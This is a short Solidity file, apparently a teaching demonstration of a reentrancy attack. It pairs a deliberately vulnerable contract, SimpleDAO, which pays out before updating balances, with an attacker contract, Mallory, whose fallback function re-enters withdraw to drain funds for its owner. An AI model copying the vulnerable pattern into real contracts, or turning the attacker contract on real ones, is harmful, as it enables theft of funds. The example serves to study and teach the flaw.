pragma solidity ^0.4.2;

contract SimpleDAO {   
  mapping (address => uint) public credit;
    
  function donate(address to) payable {
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) returns (uint){
    return credit[to];
  }

  function getBalance() public view returns (uint) {
      return address(this).balance;
  }
}

contract Mallory {
  SimpleDAO public dao;
  address owner;

  function Mallory(SimpleDAO addr){ 
    owner = msg.sender;
    dao = addr;
  }
  
  function getJackpot() { 
    bool res = owner.send(this.balance); 
  }

  function() payable { 
    dao.withdraw(dao.queryCredit(this)); 
  }

  // Helper function to check the balance of this contract
  function getBalance() public view returns (uint) {
      return address(this).balance;
  }
}
